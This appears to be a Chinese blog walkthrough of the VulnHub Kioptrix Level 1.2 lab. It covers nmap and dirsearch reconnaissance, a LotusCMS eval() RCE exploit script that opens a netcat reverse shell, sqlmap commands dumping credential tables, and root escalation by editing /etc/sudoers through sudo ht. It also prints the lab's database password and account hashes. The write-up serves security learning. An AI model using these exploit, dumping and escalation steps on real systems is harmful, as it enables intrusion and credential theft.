@@ -1,0 +1,179 @@
+<!DOCTYPE html><html lang="en" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>vulnhub-KIOPTRIX LEVEL 1.2 (#3) | hybcx's blog</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"键入以继续","blurHolder":"数据检索","noResult":"无 $0 相关数据"},"code":{"codeInfo":"$0 - $1 行","copy":"code.copy","copyFinish":"code.copyFinish","expand":"code.expand"}}</script><link rel="stylesheet" href="//unpkg.com/@waline/client@v2/dist/waline.css"><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
+if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
+ font-family: BenderLight;
+ src: local('Bender'), url("/font/BenderLight.ttf");
+}
+@font-face {
+ font-family: 'JetBrains Mono';
+ src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
+}</style><style>:root {
+  --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
+  --light-background: url('/img/bk.jpg');
+}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="数据检索" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/friends/"><span class="navItemTitle">Friends</span></a></li><li class="navItem"><a class="navBlock" href="/about"><span class="navItemTitle">About</span></a></li></ol></nav></header><div id="shadow-header"></div><article><div id="post-bg"><div id="post-title"><h1>vulnhub-KIOPTRIX LEVEL 1.2 (#3)</h1><div id="post-info"><span>文章发布时间: <div class="control"><time datetime="2023-09-23T11:02:47.461Z" id="date"> 2023-09-23</time></div></span><br><span>最后更新时间: <div class="control"><time datetime="2023-09-23T13:33:32.044Z" id="updated"> 2023-09-23</time></div></span><br><span>文章总字数: <div class="control">3.7k</div></span><br><span>预计阅读时间: <div class="control">15 分钟</div></span></div></div><hr><div id="post-content"><h1>0x01 前言</h1>
+<p>最近也是学了内网一段时间，但比较迷茫，不知从哪里下手，甚至想考虑买课来学了，但是考虑到花钱-.-于是问了几个大佬说是先刷着内网靶场，在靶场中学习内网知识点，比如vulnhub，暗月靶场等等。还是那句话，即使迷茫也不要停下学习的脚步，说不定就恍然大悟了。。。</p>
+<p>话不多说，开始本人vulnhub靶场的刷题之旅</p>
+<h1>0x02 靶场环境</h1>
+<p>攻击机（kali）：192.168.17.137</p>
+<p>靶机下载地址：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/kioptrix-level-12-3,24/">https://www.vulnhub.com/entry/kioptrix-level-12-3,24/</a></p>
+<p>kali 与靶机为同种网络模式（此处均为 NAT 模式）</p>
+<p>这里也是花了老长时间，我以为搭建也需要技术呢，搜了半天发现也没人说如何搭建，只是说攻击机与靶机一定要在同一ip段下，我也是直接下载后用vm虚拟机直接打开文件夹里的vmx文件，接着换为NAT模式，打开之后发现还要登录，我寻思密码呢？想了一下，说不定这个密码就是我们要获取的。先做着试试看</p>
+<h1>0x03 靶场渗透</h1>
+<h2 id="3-1-信息搜集"><a href="#3-1-信息搜集" class="headerlink" title="3-1-信息搜集"></a>3.1 信息搜集</h2>
+<p>当然我们此时要清楚渗透流程，当然第一步就是信息搜集—这也是第一次实战，肯定大部分都是wp看的，质量肯定低（呜呜，太菜了~~）</p>
+<p>这里跟着wp将流程好好熟悉一下，下次打的时候争取少看wp！！！—争取命令都是手敲</p>
+<h3 id="探测存活主机"><a href="#探测存活主机" class="headerlink" title="探测存活主机"></a>探测存活主机</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">netdiscover -r 192.168.17.0/24  <br></code></pre></td></tr></table></figure>
+<p>![image-20230923191442890](KIOPTRIX LEVEL 1.2 (#3)/image-20230923191442890.png)</p>
+<p>这里搜集了四个emmm，盲猜就是第三个，毕竟剩余三个很奇怪</p>
+<h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">nmap -sS -sV -A -p 1-65535 192.168.17.143<br></code></pre></td></tr></table></figure>
+<p>顺便熟悉一下nmap命令的参数细节  – 抓常用的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">1.扫描单个目标地址     nmap 192.168.0.107<br>2.扫描多个目标地址，如果目标地址不在同一网段，或在同一网段但不连续且数量不多，可以使用该方法进行扫描。<br>nmap 192.168.0.100 192.168.0.107<br><br>3.扫描一个范围内的目标地址  nmap 192.168.0.100-110  可以指定扫描一个连接的网段，中间使用“-”连接<br>4.扫描目标地址所在的某个网段 <br>以C段为例，如果目标是一个网段，则可以通过添加子网掩码的方式扫描，下列命令表示扫描范围为：192.168.0.1-182.168.0.255<br>nmap 192.168.0.0/24  <br><br>5.扫描主机列表targets.txt中所有目标的地址<br>nmap -iL  C:\Users\targets.txt   -iL 从文件中导入目标主机或者目标网段  //同一目录下可以不用绝对路径<br><br>6.扫描除某一个目标地址之外的所有目标地址<br>nmap 192.168.0.100/24 -exclude 192.168.0.107    //-exclude:后面跟的主机或网段将不在扫描的范围内<br><br>7.扫描除某一个文件中的目标地址之外的目标地址<br>nmap 192.168.0.100/24 -excludefile C:\Users\targets.txt   //-excludefile 导入文件中的主机或网段将不在扫描范围内<br><br>8.扫描某一个目标地址的21，22，23，80端口<br>如果不需要对目标主机进行全端口扫描，只想探测它是否开启某一端口，那么使用-p参数指定端口号，将大大提高扫描速度。<br>nmap 192.168.0.107 -p 21,22,23,80     //-p指定端口<br><br>9.对目标地址进行路由攻击   nmap --traceroute  192.168.0.10     //--traceroute 追踪每个路由节点<br>10.扫描目标地址所在的C段的在线状态<br>nmap -sP 192.168.0.107/24<br>nmap -sn  192.168.0.107/24   //这个两个命令都是进行主机发现，-sP/-sn 关闭主机扫描 实现ping 功能<br><br>11.对操作系统指纹的识别   nmap -O 192.168.0.107       //-O 对操作系统指纹的识别<br><br>12.目标地址提供的服务版本检测    nmap -sV  192.168.0.107      //-sV 让nmap进行版本探测<br><br>13.探测防火墙状态    nmap -sF -T4 192.168.0.107    //-sF进行FIN探测<br>-T -T4指定扫描过程使用的时序，总共有6个级别（0-5）级别越高扫描速度越快，但是也容易被防火墙检测并屏蔽掉，在网络情况较好的是可以使用T4<br><br>剩下的就是命令组合的了<br></code></pre></td></tr></table></figure>
+<p>具体可参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_56607768/article/details/123461324?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=nmap%E5%91%BD%E4%BB%A4%E5%8F%82%E6%95%B0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-6-123461324.142%5Ev94%5Einsert_down1&amp;spm=1018.2226.3001.4187">nmap常用命令详细使用|命令带实例 </a>  --这里简单过一下，日后用的时候看着用，熟练就好了</p>
+<p>![image-20230923192950046](KIOPTRIX LEVEL 1.2 (#3)/image-20230923192950046.png)</p>
+<p>扫到如上信息，接着看一下靶机附带文件给的信息</p>
+<p>![image-20230923193028820](KIOPTRIX LEVEL 1.2 (#3)/image-20230923193028820.png)</p>
+<p>这里没咋懂他的意思，估计是修改域名解析吧，我们看看wp</p>
+<p>wp：按提示添加 host 记录到攻击机：<code>sudo nano /etc/hosts</code></p>
+<p>没用过这个命令，所以我用vim了<code>vim /etc/hosts</code>，添加内容：<code>192.168.17.143 kioptrix3.com</code></p>
+<p>![image-20230923193441839](KIOPTRIX LEVEL 1.2 (#3)/image-20230923193441839.png)</p>
+<p>这里新kali没dirsearch，等我下载一下，这里又看到一个小tip</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">192.168.233.1		vm8网卡<br>192.168.233.2		网关<br>192.168.233.177		靶机<br>192.168.233.254		DHCP服务器<br></code></pre></td></tr></table></figure>
+<p>故此我们猜的是对的</p>
+<h3 id="web目录扫描"><a href="#web目录扫描" class="headerlink" title="web目录扫描"></a>web目录扫描</h3>
+<p>使用 dirsearch 进行目录扫描：<code>dirsearch -u http://kioptrix3.com -x 400-599 -t 50</code></p>
+<p>此处-x是为了排除页面400-599的状态码回显，-t为设置线程数，不过似乎不设置 hosts直接扫ip也可以吧，但说不定后续有用？</p>
+<p>![image-20230923194338037](KIOPTRIX LEVEL 1.2 (#3)/image-20230923194338037.png)</p>
+<p>访问了一下，发现已经有了web网站了，我们看一下扫出的结果，一个个访问看看有什么想信息</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs http">[19:43:15] 200 -    2KB - /cache/                                           <br>[19:43:15] 301 -  353B  - /cache  -&gt;  http://kioptrix3.com/cache/           <br>[19:43:18] 200 -  688B  - /core/fragments/moduleInfo.phtml                  <br>[19:43:18] 301 -  352B  - /core  -&gt;  http://kioptrix3.com/core/             <br>[19:43:23] 200 -   23KB - /favicon.ico                                      <br>[19:43:24] 301 -  355B  - /gallery  -&gt;  http://kioptrix3.com/gallery/       <br>[19:43:27] 200 -    2KB - /index.php                                        <br>[19:43:27] 200 -    2KB - /index.php/login/                                 <br>[19:43:33] 200 -    2KB - /modules/                                         <br>[19:43:33] 301 -  355B  - /modules  -&gt;  http://kioptrix3.com/modules/       <br>[19:43:37] 301 -  358B  - /phpmyadmin  -&gt;  http://kioptrix3.com/phpmyadmin/ <br>[19:43:38] 200 -    8KB - /phpmyadmin/                                      <br>[19:43:38] 200 -    8KB - /phpmyadmin/index.php                             <br>[19:43:46] 301 -  353B  - /style  -&gt;  http://kioptrix3.com/style/           <br>[19:43:49] 200 -   18B  - /update.php     <br></code></pre></td></tr></table></figure>
+<p>![image-20230923194820587](KIOPTRIX LEVEL 1.2 (#3)/image-20230923194820587.png)</p>
+<p>访问了一下，直接用admin就登进去了</p>
+<p>![image-20230923194938034](KIOPTRIX LEVEL 1.2 (#3)/image-20230923194938034.png)</p>
+<p>不过似乎没啥信息，接着看了update.php，发现无权访问，这里肯定有问题</p>
+<p>![image-20230923195108757](KIOPTRIX LEVEL 1.2 (#3)/image-20230923195108757.png)</p>
+<p>接着看了modules目录，展示了此网站目录结构</p>
+<p>![image-20230923195459051](KIOPTRIX LEVEL 1.2 (#3)/image-20230923195459051.png)</p>
+<p>总的来说，没啥思路了┭┮﹏┭┮，看wp吧</p>
+<h3 id="web网站指纹扫描"><a href="#web网站指纹扫描" class="headerlink" title="web网站指纹扫描"></a>web网站指纹扫描</h3>
+<p>针对 web 页面进行信息搜集，使用 whatweb 扫描网站信息：<code>whatweb http://kioptrix3.com</code></p>
+<p>![image-20230923200117955](KIOPTRIX LEVEL 1.2 (#3)/image-20230923200117955.png)</p>
+<p>发现关键词，lotusCMS，直觉告诉我此处必有漏洞，搜了一番发现此系统有一个RCE漏洞，直接将其exp先下载一下，接着看看网站那里存在CMS</p>
+<p>![image-20230923200516077](KIOPTRIX LEVEL 1.2 (#3)/image-20230923200516077.png)</p>
+<p>在访问后页面有个login点击发现，此登录功能采用的就是上述CMS，看了wp有如下思路</p>
+<p>通过 searchsploit 查询此 CMS 相关漏洞：<code>searchsploit lotuscms</code></p>
+<p>![image-20230923200651665](KIOPTRIX LEVEL 1.2 (#3)/image-20230923200651665.png)</p>
+<p>恰好跟我搜的RCE对上了，接着wp说：查找到存在 RCE 但是需要用到 MSF，为贴近 OSCP 考试，尽量不使用 MSF，上网查询是否存在其他 exp 代码，好好好~~这么玩是吧，那我紧跟佬的步伐0.o</p>
+<p>这是佬的搜索方法</p>
+<p>![image-20230923200828274](KIOPTRIX LEVEL 1.2 (#3)/image-20230923200828274.png)</p>
+<p>我也附上exp链接：<a target="_blank" rel="noopener" href="https://github.com/Hood3dRob1n/LotusCMS-Exploit">https://github.com/Hood3dRob1n/LotusCMS-Exploit</a></p>
+<h2 id="3-2-漏洞利用"><a href="#3-2-漏洞利用" class="headerlink" title="3-2-漏洞利用"></a>3.2 漏洞利用</h2>
+<h3 id="lotusCMS-RCE"><a href="#lotusCMS-RCE" class="headerlink" title="lotusCMS-RCE"></a>lotusCMS-RCE</h3>
+<p>将其下载到攻击机并赋予可执行权限：这里我直接将zip拖进kali了</p>
+<p>![image-20230923201145279](KIOPTRIX LEVEL 1.2 (#3)/image-20230923201145279.png)</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><span class="hljs-comment"># Lotus CMS 3.0 eval() Remote Command Execition Exploit</span><br><span class="hljs-comment"># flaw in router() function, original write-up: http://secunia.com/secunia_research/2011-21/</span><br><span class="hljs-comment"># Scripted in Bash by HR</span><br><span class="hljs-comment"># USAGE: ./lotusRCE.sh target lotusCMS-path</span><br><span class="hljs-comment"># USAGE: ./lotusRCE.sh ki0ptrix3.com /</span><br><span class="hljs-comment"># USAGE: ./lotusRCE.sh 192.168.1.36 /lcms/</span><br><span class="hljs-comment"># Enter IP and PORT when asked to spawn netcat based reverse shell ;)</span><br><br><span class="hljs-comment">#Start the magic</span><br>target=<span class="hljs-string">&quot;<span class="hljs-variable">$1</span>&quot;</span> <span class="hljs-comment">#Target site, ex: 192.168.1.36 or ki0ptrix3.com (no http://)</span><br>path=<span class="hljs-string">&quot;<span class="hljs-variable">$2</span>&quot;</span> <span class="hljs-comment"># Path to LotusCMS, ex: /lcms/ or /</span><br>junk=/tmp<br>storage1=$(<span class="hljs-built_in">mktemp</span> -p <span class="hljs-string">&quot;<span class="hljs-variable">$junk</span>&quot;</span> -t fooooobar1.tmp.XXX)<br>storage2=$(<span class="hljs-built_in">mktemp</span> -p <span class="hljs-string">&quot;<span class="hljs-variable">$junk</span>&quot;</span> -t fooooobar2.tmp.XXX)<br></code></pre></td></tr></table></figure>
+<p>此处为代码的用法，可以看出是要反弹shell的。</p>
+<p>先新建窗口建立起 nc 监听：<code>nc -lvnp 4444</code></p>
+<p>然后运行 exp 代码：<code>./lotusRCE.sh kioptrix3.com /</code></p>
+<p>运行后按提示输入用于接收反弹 shell 的 IP 和端口，并选择反弹方式：</p>
+<p>![image-20230923201445552](KIOPTRIX LEVEL 1.2 (#3)/image-20230923201445552.png)</p>
+<p>![image-20230923201609119](KIOPTRIX LEVEL 1.2 (#3)/image-20230923201609119.png)</p>
+<p>选择反弹方式 <strong>1</strong> 之后，nc 收到反弹 shell，权限为 <strong>www-data</strong>：</p>
+<p>![image-20230923201646856](KIOPTRIX LEVEL 1.2 (#3)/image-20230923201646856.png)</p>
+<p>使用 Python 建立 TTY Shell：<code>python -c 'import pty;pty.spawn(&quot;/bin/bash&quot;);'</code></p>
+<p>翻一下目录尝试搜集有效信息，在当前位置下的 <code>/gallery</code> 文件夹下发现存在疑似配置文件 <code>gconfig.php</code>：</p>
+<p>![image-20230923201913897](KIOPTRIX LEVEL 1.2 (#3)/image-20230923201913897.png)</p>
+<p>读取看一下，发现存在数据库的配置信息</p>
+<p>![image-20230923202004834](KIOPTRIX LEVEL 1.2 (#3)/image-20230923202004834.png)</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;gallarific_mysql_server&quot;</span>] = <span class="hljs-string">&quot;localhost&quot;</span>;<br><span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;gallarific_mysql_database&quot;</span>] = <span class="hljs-string">&quot;gallery&quot;</span>;<br><span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;gallarific_mysql_username&quot;</span>] = <span class="hljs-string">&quot;root&quot;</span>;<br><span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;gallarific_mysql_password&quot;</span>] = <span class="hljs-string">&quot;fuckeyou&quot;</span>;<br></code></pre></td></tr></table></figure>
+<p>存一下，接着想到了phpmyadmin，我们登陆看看，这里也是震惊了，之前我只用 admin登录，现在用上述给的账号密码登录，页面回显竟然不一样。。。</p>
+<h3 id="ssh登录用户"><a href="#ssh登录用户" class="headerlink" title="ssh登录用户"></a>ssh登录用户</h3>
+<p>![image-20230923202247609](KIOPTRIX LEVEL 1.2 (#3)/image-20230923202247609.png)</p>
+<p>接着发现了两处用户信息</p>
+<p><code>dev_accounts</code> 表中的用户信息：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">dreg 			0d3eccfb887aabd50f243b3f155c0f85<br>loneferret  	5badcaf789d3d1d09794d8f021f40f0e<br></code></pre></td></tr></table></figure>
+<p><code>gallarific_users</code>表中的信息：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">admin 	n0t7t1k4  superuser<br></code></pre></td></tr></table></figure>
+<p>这里用md5解密看看，上述dev表解密的信息为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">Mast3r 与 starwars<br></code></pre></td></tr></table></figure>
+<p>接着前往之前的登录页面看看，发现上述三个都登录不上，接着wp说</p>
+<p>换 ssh 登录，dreg、loneferret 可成功登录。</p>
+<p>这里dreg用户没有信息，登录另一个即可。</p>
+<p>接着佬又开始漏洞挖掘了，访问 <code>http://kioptrix3.com/gallery/</code> 进行漏洞挖掘：</p>
+<p>![image-20230923203825517](KIOPTRIX LEVEL 1.2 (#3)/image-20230923203825517.png)</p>
+<p>如图我发现点击每个链接，页面都会回显一些18禁的内容。。。。。。我真被震惊到了，估计是题目现在出问题了？，于是我还是直接访问答案吧。</p>
+<p>点击页面 <strong>Ligoat Press Room</strong> 进入新页面，左下角有排序选项框，任选之后发现 url 出现了 id 参数：（但我根本点不了）</p>
+<p>![image-20230923204011375](KIOPTRIX LEVEL 1.2 (#3)/image-20230923204011375.png)</p>
+<p>将此 url 丢到 sqlmap 进行测试：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">sqlmap -u &quot;http://kioptrix3.com/gallery/gallery.php?id=1&quot;<br></code></pre></td></tr></table></figure>
+<p>![image-20230923204344017](KIOPTRIX LEVEL 1.2 (#3)/image-20230923204344017.png)</p>
+<p>如图发现存在sql注入，接着爆数据库，表名等等，不过猜测爆出来的就是刚刚RCE得到的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">利用sqlmap得到数据库名：sqlmap -u &quot;http://kioptrix3.com/gallery/gallery.php?id=1&quot; --dbs<br><br>sqlmap -u &quot;http://kioptrix3.com/gallery/gallery.php?id=1&quot; -D gallery --tables --batch<br><br>sqlmap -u &quot;http://kioptrix3.com/gallery/gallery.php?id=1&quot; -D gallery -T dev_accounts --columns --batch<br><br>sqlmap -u &quot;http://kioptrix3.com/gallery/gallery.php?id=1&quot; -D gallery -T dev_accounts -C username,password --dump --batch<br></code></pre></td></tr></table></figure>
+<p>![image-20230923204513242](KIOPTRIX LEVEL 1.2 (#3)/image-20230923204513242.png)</p>
+<p>![image-20230923204602653](KIOPTRIX LEVEL 1.2 (#3)/image-20230923204602653.png)</p>
+<p>![image-20230923204728931](KIOPTRIX LEVEL 1.2 (#3)/image-20230923204728931.png)</p>
+<p>最终得到用户名和密码</p>
+<h3 id="sudo权限提升"><a href="#sudo权限提升" class="headerlink" title="sudo权限提升"></a>sudo权限提升</h3>
+<p>查看 loneferret 用户，家目录下存在两个文件，可执行脚本 <code>checksec.sh</code> 是逆向中用于检测目标文件使用了哪些防护技术的，在 <code>CompanyPolicy.README</code> 文件中找到提示信息，要运行命令：<code>sudo ht</code></p>
+<p>这里我采用的finalshell连接ssh，佬是用kali的</p>
+<p>ht 编辑器使用说明：<a target="_blank" rel="noopener" href="https://www.aldeid.com/wiki/HT-Editor">https://www.aldeid.com/wiki/HT-Editor</a></p>
+<p>按 F3 调出文件窗口，输入 <code>/etc/sudoers</code> 回车进行编辑：</p>
+<p>![image-20230923205039949](KIOPTRIX LEVEL 1.2 (#3)/image-20230923205039949.png)</p>
+<p>不过这似乎不得不kali了，不过让我崩溃的是kali的ssh功能竟然报错，信息如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">Unable to negotiate with 192.168.17.143 port 22: no matching host key type found. Their offer: ssh-rsa,ssh-dss<br></code></pre></td></tr></table></figure>
+<p>搜寻一番发现此文章或许可以解决：[<a target="_blank" rel="noopener" href="https://askubuntu.com/questions/836048/ssh-returns-no-matching-host-key-type-found-their-offer-ssh-dss">SSH 返回：未找到匹配的主机密钥类型。他们的报价：ssh-dss</a></p>
+<p>![image-20230923211220504](KIOPTRIX LEVEL 1.2 (#3)/image-20230923211220504.png)成功链接，接着sudo ht</p>
+<p>![image-20230923211256972](KIOPTRIX LEVEL 1.2 (#3)/image-20230923211256972.png)</p>
+<p>但却报错了，信号这位佬也跟我一样：</p>
+<p>运行出现报错提示：Error opening terminal: xterm-256color.</p>
+<p>查询是新版 kali 的终端配色<strong>过于先进</strong>，降级一下：<code>export TERM=xterm-color</code></p>
+<p>验证一下 sudo 权限：</p>
+<p>![image-20230923211513202](KIOPTRIX LEVEL 1.2 (#3)/image-20230923211513202.png)</p>
+<p>发现 su 和 ht 具有 root 权限，尝试运行 su 命令失败，无法直接切换至 root 用户。</p>
+<p>再次运行：<code>sudo ht</code></p>
+<p>![image-20230923211416068](KIOPTRIX LEVEL 1.2 (#3)/image-20230923211416068.png)</p>
+<p>ht 编辑器使用说明：<a target="_blank" rel="noopener" href="https://www.aldeid.com/wiki/HT-Editor">https://www.aldeid.com/wiki/HT-Editor</a></p>
+<p>按 F3 调出文件窗口，输入 <code>/etc/sudoers</code> 回车进行编辑：</p>
+<p>![image-20230923211552544](KIOPTRIX LEVEL 1.2 (#3)/image-20230923211552544.png)</p>
+<p>将原有 loneferret 条目修改为：<code>loneferret ALL=(ALL) ALL</code></p>
+<p>![image-20230923211709870](KIOPTRIX LEVEL 1.2 (#3)/image-20230923211709870.png)</p>
+<p>修改完毕按 F2 保存，然后按 F10 退出，回到终端后运行命令：<code>sudo su -</code>（输入 loneferret 密码 starwars）</p>
+<p>![image-20230923211824238](KIOPTRIX LEVEL 1.2 (#3)/image-20230923211824238.png)</p>
+<p>成功获取root权限，在该目录下找flag即可</p>
+<p>![image-20230923212349728](KIOPTRIX LEVEL 1.2 (#3)/image-20230923212349728.png)</p>
+<p>但没想到这就是 flag，emmm</p>
+<h1>0x04 总结</h1>
+<p>回顾一下此次渗透路程：进到内网之后，首先就是扫描主机存活，随后针对某个主机展开渗透，然后呢先进行简单却关键的信息搜集，如端口扫描，找到可以端口便可以扫一下web网站的目录，看看网站中会存在哪些常见漏洞。</p>
+<p>当然在此期间也要对web网站做好信息搜集，比如用的什么中间件，采用的何种CMS等等，更要学会在搜集到可疑信息后，可疑在百度，google，gihub等处找到合适的exp等漏洞利用手段。</p>
+<p>找到之后无非就是想要获取一些重要数据，比如账号密码之类的，这会成为后续ssh连接的重要手段。</p>
+<p>当我们成功获取靶机shell时，肯定就是要想办法提权，因为不可能运气爆棚直接就是最高权限，而我们渗透的最终目的就是拿下靶机的最高权限。在此期间可能就要充足的技术去知道利用何种技术去提权，做免杀等等。</p>
+<p>此次渗透旅程让我受益颇丰，再接再厉，希望日后可以靠自己的脑子，走的更远。</p>
+<p>不过话又说回来了，我得去学一下sudo提权了，感觉在此处的理解不够深刻。我们换一篇文章探讨！</p>
+<h1>0x05 参考文章</h1>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/LYJ20010728/article/details/119523573">VulnHub渗透测试实战靶场 - KIOPTRIX: LEVEL 1.2</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Cx330Lm/articles/16976249.html">[vulnhub靶场Kioptrix: Level 1.2 (#3) ]</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.z0sen.me/archives/kioptrix-level-1-2">Kioptrix: Level 1.2</a></p>
+<div id="paginator"></div></div><div id="post-footer"><div id="pages" style="justify-content: flex-end"><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/09/20/Gitlab%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-9086%EF%BC%89/">Gitlab 任意文件读取漏洞（CVE-2016-9086） 上一篇 →</a></div></div></div><div id="comments"><div id="waline"></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="回到顶部" style="opacity: 0; display: none;">∧</a><a class="i-index" id="to-index" href="#toc-div" title="文章目录">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="切换主题"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">hybcx</a></h1><div id="description"><p></p></div></div><div id="aside-block"><div id="toc-div"><h1>目录</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">0x01 前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">2.</span> <span class="toc-text">0x02 靶场环境</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">3.</span> <span class="toc-text">0x03 靶场渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#3-1-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">3.1.</span> <span class="toc-text">3.1 信息搜集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8E%A2%E6%B5%8B%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA"><span class="toc-number">3.1.1.</span> <span class="toc-text">探测存活主机</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">3.1.2.</span> <span class="toc-text">端口扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F"><span class="toc-number">3.1.3.</span> <span class="toc-text">web目录扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" 